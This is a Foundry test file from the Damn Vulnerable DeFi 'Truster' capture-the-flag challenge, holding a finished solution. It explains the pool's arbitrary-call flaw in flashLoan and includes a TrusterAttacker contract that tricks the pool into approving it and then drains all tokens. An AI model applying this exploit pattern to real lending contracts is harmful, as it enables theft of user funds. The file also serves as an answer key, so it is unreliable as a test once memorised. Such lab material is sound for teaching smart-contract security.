// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";

contract TrusterChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");
    
    uint256 constant TOKENS_IN_POOL = 1_000_000e18;

    DamnValuableToken public token;
    TrusterLenderPool public pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        // Deploy token
        token = new DamnValuableToken();

        // Deploy pool and fund it
        pool = new TrusterLenderPool(token);
        token.transfer(address(pool), TOKENS_IN_POOL);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool.token()), address(token));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(token.balanceOf(player), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_truster() public checkSolvedByPlayer {
        /**
         * VULNERABILITY EXPLANATION:
         * The TrusterLenderPool.flashLoan() function accepts arbitrary target and data parameters
         * and executes target.functionCall(data) on line 28. This allows anyone to make the pool
         * execute any function on any contract.
         *
         * The critical flaw is that we can make the pool call token.approve(attacker, amount),
         * granting us permission to spend the pool's tokens via transferFrom.
         *
         * EXPLOIT STRATEGY:
         * 1. Deploy an attacker contract that in a single transaction:
         *    a) Calls flashLoan with amount=0, target=token, data=approve(this, poolBalance)
         *    b) Calls token.transferFrom(pool, recovery, poolBalance) to drain all funds
         * 2. This satisfies the single-transaction constraint via contract deployment
         */
        
        // Deploy attacker contract which executes the exploit in its constructor
        new TrusterAttacker(pool, token, recovery, TOKENS_IN_POOL);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        // All rescued funds sent to recovery account
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
    }
}

/**
 * @notice Attacker contract that exploits the arbitrary function call vulnerability
 * @dev All exploit logic runs in the constructor to execute in a single transaction
 */
contract TrusterAttacker {
    constructor(TrusterLenderPool pool, DamnValuableToken token, address recovery, uint256 amount) {
        // Step 1: Call flashLoan with 0 tokens borrowed, but make the pool approve this contract
        // The pool executes token.approve(this, amount) on our behalf
        pool.flashLoan(
            0,                                                              // borrow nothing
            address(this),                                                  // borrower (doesn't matter)
            address(token),                                                 // target: the token contract
            abi.encodeWithSignature("approve(address,uint256)", address(this), amount)  // approve this contract
        );
        
        // Step 2: Now we have approval, drain all tokens to recovery
        token.transferFrom(address(pool), recovery, amount);
    }
}
